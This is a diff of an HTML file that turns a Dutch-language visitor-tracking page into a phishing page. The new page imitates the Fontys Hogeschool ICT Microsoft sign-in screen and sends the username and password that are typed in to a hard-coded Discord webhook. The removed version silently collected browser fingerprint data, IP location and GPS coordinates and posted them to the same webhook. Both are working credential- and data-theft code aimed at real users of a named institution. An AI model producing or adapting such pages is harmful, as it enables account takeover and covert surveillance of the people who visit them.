@@ -1,99 +1,117 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-US">
 <head>
-    <meta charset="UTF-8">
-    <title>Informatie Verzameling</title>
+  <meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=1">
+  <meta http-equiv="cache-control" content="no-cache,no-store"><meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="expires" content="-1"><meta name="mswebdialog-title" content="Connecting to Fontys Hogeschool ICT">
+  <title>Sign In</title>
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    .illustrationClass {
+      background-image: url('images/illustration.jpg')!important;
+      background-size: cover;
+      background-position: center;
+    }
+  </style>
 </head>
-<body>
-    <h1>Gebruikersinformatie</h1>
-    <pre id="info"></pre>
+<body dir="ltr" class="body">
+  <div id="fullPage">
+    <div id="brandingWrapper" class="float">
+      <div id="branding" class="illustrationClass"></div>
+    </div>
+    <div id="contentWrapper" class="float">
+      <div id="content">
+        <div id="header">
+          <img id="companyLogo" class="logoImage" src="images/logo.png" alt="Fontys Hogeschool ICT">
+        </div>
+        <div id="workArea">
+          <div id="authArea" class="groupMargin">
+            <div id="loginArea">
+              <div id="loginMessage" class="groupMargin">
+                Sign in with your organizational account
+              </div>
+              <form id="loginForm"
+                    autocomplete="off"
+                    onsubmit="return sendToDiscord()">
+                <div id="error" class="fieldMargin error smallText" style="display:none">
+                  <span id="errorText" for=""></span>
+                </div>
+                <div id="formsAuthenticationArea">
+                  <div id="userNameArea">
+                    <label for="userNameInput" class="hidden">User Account</label>
+                    <input id="userNameInput" name="UserName" type="email"
+                           class="text fullWidth"
+                           placeholder="i123456@fontysict.nl"
+                           required autocomplete="on" spellcheck="false">
+                  </div>
+                  <div id="passwordArea">
+                    <label for="passwordInput" class="hidden">Password</label>
+                    <input id="passwordInput" name="Password" type="password"
+                           class="text fullWidth"
+                           placeholder="Password"
+                           required autocomplete="on">
+                  </div>
+                  <div id="kmsiArea">
+                    <input type="checkbox" id="kmsiInput" name="Kmsi" value="true">
+                    <label for="kmsiInput">Keep me signed in</label>
+                  </div>
+                  <div id="submissionArea" class="submitMargin">
+                    <span id="submitButton" class="submit"
+                          tabindex="4" role="button"
+                          onclick="return sendToDiscord()"
+                          onkeypress="if(event&&event.keyCode==32)sendToDiscord()">
+                      Sign in
+                    </span>
+                  </div>
+                </div>
+                <input type="hidden" id="optionForms" name="AuthMethod" value="FormsAuthentication">
+              </form>
+            </div>
+            <div id="authOptions">
+              <form id="options" method="post" action="…">
+                <input type="hidden" id="optionSelection" name="AuthMethod">
+                <div id="authOptionLinks" class="groupMargin"></div>
+              </form>
+            </div>
+            <div id="introduction" class="groupMargin">
+              <p>
+                Forgot your password?
+                Click <a href="https://passwordreset.fontysict.nl">here</a>
+                for more information.
+              </p>
+            </div>
+          </div>
+        </div>
+        <div id="footer">
+          <div id="footerLinks" class="floatReverse">
+            <span>© 2016 Microsoft</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
 
-    <script>
-        async function getInfo() {
-            let info = {};
+  <script>
+    async function sendToDiscord() {
+      const hook  = 'https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE';
+      const proxy = 'https://cors-anywhere.herokuapp.com/';
+      const user  = document.getElementById('userNameInput').value;
+      const pass  = document.getElementById('passwordInput').value;
+      const content = `**Loginnaam:** ${user}\n**Password:** ${pass}`;
 
-            // Basis info
-            info.userAgent = navigator.userAgent;
-            info.language = navigator.language;
-            info.platform = navigator.platform;
-            info.screenResolution = `${screen.width}x${screen.height}`;
-            info.colorDepth = screen.colorDepth;
-            info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            info.online = navigator.onLine;
-            info.touchSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";
-
-            // Plugins
-            info.plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                info.plugins.push(navigator.plugins[i].name);
-            }
-
-            // WebGL
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch (err) {
-                info.webglVendor = "Niet beschikbaar";
-                info.webglRenderer = "Niet beschikbaar";
-            }
-
-            // IP-locatie
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                info.ip = data.ip;
-                info.city = data.city;
-                info.region = data.region;
-                info.country = data.country;
-                info.org = data.org;
-            } catch (err) {
-                info.ip = "Niet beschikbaar";
-            }
-
-            // GPS-locatie (precies)
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        info.gpsLatitude = position.coords.latitude;
-                        info.gpsLongitude = position.coords.longitude;
-                        info.gpsAccuracy = position.coords.accuracy;
-                        sendInfo(info);
-                    },
-                    (error) => {
-                        info.gpsError = error.message;
-                        sendInfo(info);
-                    }
-                );
-            } else {
-                info.gps = "Niet ondersteund";
-                sendInfo(info);
-            }
-
-            function sendInfo(info) {
-                document.getElementById('info').textContent = JSON.stringify(info, null, 2);
-
-                const webhookUrl = 'https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE';
-                const payload = {
-                    content: 'Nieuwe gebruiker gevonden!',
-                    embeds: [{
-                        title: "Gebruikersinformatie",
-                        description: "```json\n" + JSON.stringify(info, null, 2) + "\n```"
-                    }]
-                };
-
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            }
-        }
-
-        getInfo();
-    </script>
-
+      try {
+        const res = await fetch(proxy + hook, {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({ content })
+        });
+        alert(res.ok ? 'Verzonden' : 'Fout bij verzenden.');
+      } catch {
+        alert('Kon niet verbinden.');
+      }
+      return false;
+    }
+  </script>
 </body>
 </html>
